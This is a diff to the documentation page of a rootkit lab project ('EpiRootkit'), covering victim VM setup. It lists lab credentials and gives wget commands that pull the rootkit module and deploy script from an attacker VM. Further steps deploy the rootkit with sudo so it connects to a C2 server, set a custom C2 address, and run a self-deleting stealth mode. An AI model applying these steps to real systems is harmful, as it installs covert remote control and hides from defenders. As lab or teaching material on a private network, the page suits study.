@@ -9,47 +9,46 @@ toc: true
 weight: 204
 ---
 
-# Victim VM Setup
 
-Deploy the EpiRootkit kernel module on the victim system.
 
 ## Prerequisites
 
-1. **Host setup complete**: [Host Environment Setup]({{< relref "environment.md" >}})
-2. **VM downloaded**: `vm/victim.qcow2` in project root
+1. **Host setup**: [Host Environment Setup]({{< relref "environment.md" >}})
+2. **VM disk**: `victim.qcow2` in `/var/lib/libvirt/images/`
 3. **VM launched**: `sudo ./scripts/run_vms.sh victim`
+
 
 ## VM Access
 
-**Connection Details:**
-- **IP Address**: 192.168.200.10 (static)
-- **Username**: `victim` / **Password**: `jules`
-- **Target**: Ubuntu 20.04 LTS with kernel 5.4.0
+- **IP**: 192.168.200.10 (static)
+- **Credentials**: `victim` / `jules`
+- **Target**: Ubuntu 20.04 LTS (kernel 5.4.0)
 
-## Deployment Process
+## Deploy Rootkit
 
-### 1. Receive Payload
-Get the rootkit files from the attacker VM:
+### 1. Get Payload
+Receive rootkit files from attacker VM:
 
 ```bash
 # Option A: HTTP download
 wget http://192.168.200.11:8080/epirootkit.ko
 wget http://192.168.200.11:8080/deploy_rootkit.sh
 
-# Option B: SCP transfer
-# Files transferred by attacker to victim@192.168.200.10:~/
+# Option B: SCP transfer (from attacker VM)
+# First: sudo apt install -y openssh-server (inside victim VM)
+scp epirootkit.ko deploy_rootkit.sh victim@192.168.200.10:~/
 
-# Option C: Web UI upload
-# Use attacker's web interface file transfer panel
+# Option C: Web UI upload (In development)
+# Use attacker's web interface file transfer 
 ```
 
-### 2. Deploy Rootkit
+### 2. Deploy
 ```bash
-# Basic deployment (connects to 192.168.200.11:4444)
+# Default deployment (connects to 192.168.200.11:4444)
 sudo ./deploy_rootkit.sh
 
 # Custom C2 server
-sudo ./deploy_rootkit.sh address=IP port=PORT
+sudo ./deploy_rootkit.sh address=IP/domain port=PORT
 
 # Stealth deployment (self-destructs)
 sudo ./deploy_rootkit.sh --self-delete
@@ -76,4 +75,7 @@ sudo ./deploy_rootkit.sh status
 sudo ./deploy_rootkit.sh uninstall
 ```
 
-For detailed deployment script options, see [EpiRootkit Deployment](../../05-epirootkit/deployment.md).
+## Next Steps
+
+1. **Control**: Use [C2 Server](../../03-attacking-program/overview.md) or [Web UI](../../04-web-ui/overview.md)
+2. **Features**: Explore [Rootkit Features](../../05-epirootkit/features/)
